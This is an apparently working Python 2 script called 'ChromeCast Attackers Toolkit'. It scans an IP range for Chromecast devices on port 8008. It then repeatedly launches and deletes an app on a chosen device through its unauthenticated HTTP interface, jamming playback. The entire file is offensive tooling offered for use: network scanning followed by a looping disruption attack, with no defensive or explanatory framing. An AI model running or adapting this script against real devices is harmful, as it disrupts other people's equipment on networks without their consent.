import socket
import time
import urllib
import urllib2
from netaddr import IPRange


def jam(HOST,PORT,timing):
	timebool = 1
	while timebool:

		url = 'http://' + HOST + ':' + str(PORT) + '/apps/Songza_App'
		values = {'_':'1111111111111111'}

		data = urllib.urlencode(values)
		reqs = urllib2.Request(url, data)
		resp = urllib2.urlopen(reqs)
		dat = resp.read()
		
		time.sleep(.1)
		
		s = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
		s.connect((HOST, PORT))
		req = "DELETE /apps/Songza_App HTTP/1.1\r\nHost: " + HOST + ":" + str(PORT) + "\r\nAccept: */*\r\nContent-Type: application/json\r\n\r\n"
		s.sendall(req)
		data = s.recv(10240)
		print data
		
		time.sleep(1.5)
		
		if timing == "1":
			timebool = 1
		elif timing == "2":
			timebool = 2
	choose()
		
def chromecast_finder(addresses):
	ccasts = []
	for addr in addresses:
		addr2 = str(addr)
		print addr2
		try :
			request = ("http://"+addr2+":8008/ssdp/device-desc.xml")
			urllib2.urlopen(request, timeout=.5)
			ccasts.append(addr)
			print "1"
			print ""
			#s.close()
			ccasts.append(addr)
		except:
			print "0"
			print ""
	print ""
	print ""
	return ccasts		
def choose():
	option = raw_input("> ")
	if option == '1':
		print "[1] Continuous"
		print "[2] Short"
		attacklen = raw_input("> ")
		for x in range(0,len(casts) - 1):
			print '['+str(x)+'] '+str(casts[x])
		ip_attack = raw_input("Which Chromecast to attack: ")
		ip_attack2 = casts[int(ip_attack)]
		
		jam(str(ip_attack2),8008, str(attacklen))
	else:
		print "Invalid input, try again"
		choose()
		

print "ChromeCast Attackers Toolkit"
print ''
addresses = list(IPRange(raw_input('Start IP: '), raw_input('End IP: ')))
casts = chromecast_finder(addresses)
print "[1] Chrome jamslammer"
choose()

	

	
	
		